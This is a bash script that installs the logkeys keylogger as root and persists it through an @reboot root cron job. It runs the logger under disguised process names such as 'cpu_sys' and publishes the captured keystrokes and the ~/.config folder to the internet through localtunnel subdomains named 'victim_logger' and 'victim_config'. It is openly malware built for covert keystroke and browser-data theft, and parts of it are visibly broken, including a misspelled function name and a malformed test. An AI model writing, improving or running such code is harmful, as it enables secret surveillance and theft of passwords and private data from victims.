#! /bin/bash

if [ `id -u` -ne 0 ]; then
    echo "You must be root to run this script, Exiting.."
    exit 1
fi

CHECK_PROC=`ps aux | grep -i "setup.sh" | grep -v "grep" | wc -l`
USER=`whoami`
CRON_FILE="/var/spool/cron/root"
INSTALL_DIR="/usr/local/core_sys"
SHELL_DEST="/usr/local/core_sys/core.sh"
ME=`basename $0`
CONFIG_PATH="~/.config"

if [ $CHECK_PROC -gt 1 ]; then
    echo "Another instance of this script is already running, Exiting.."
    exit 1
fi

if [ ! -f $CRON_FILE ]; then
    echo "cron file for root doesnot exist, creating.."
    touch $CRON_FILE
    /usr/bin/crontab $CRON_FILE
fi

INSTALL() {
    echo "Installing.."
    apt install -y build-essential autotools-dev autoconf kbd
    git clone https://github.com/kernc/logkeys.git $INSTALL_DIR
    cd $INSTALL_DIR
    ./autogen.sh
    cd build 
    ../configure

    make
    make install

    apt install npm nodejs
    npm install -g localtunnel
}

if [ ! dpkg -l | grep -i "kbd" ]; then
    INSTALL
else
    echo "Logkeys already installed, Exiting.."
    exit 1
fi

if [ ! -f $SHELL_DEST ]; then
    echo "Creating shell script.."
    touch $SHELL_DEST
    cat $ME >> $SHELL_DEST
    chmod +x $SHELL_DEST
fi


if [ $CHECK_PROC -gt 1 ]; then
    echo "Another instance of this script is already running, Exiting.."
    exit 1
   else
        echo "setup.sh is not running"
        echo "@reboot /bin/bash $SHELL_DEST" >> $CRON_FILE
        crontab $CRON_FILE
        echo "setup.sh is running"
fi

KEYLOGGER() {
    echo "Starting keylogger.."
    for i in {1..31}; do
        PROC_NAME="cpu_sys$i"
        OUTPUT_FILE="/var/log/core_sys/core_sys$i.log"
        EVENT_NAME="event$i"
        bash -c "exec -a $PROC_NAME logkeys -s -d $EVENT_NAME --output $OUTPUT_FILE &" 
        rm -rf /var/run/logkeys.pid
    done
}

FTP_SERV#R() {
    echo "Starting ftp server.."
    cd $INSTALL_DIR
    python -m http.server 31
    lt --local-host 0.0.0.0 --port 31 --subdomain victim_logger
}

BROWSER_HISTORY() {
    echo "Starting browser history.."
    cd $CONFIG_PATH
    python -m http.server 32
    lt --local-host 0.0.0.0 --port 32 --subdomain victim_config
}


MAIN() {
    echo "Starting main.."
    KEYLOGGER
    FTP_SERVER
    BROWSER_HISTORY
}

MAIN

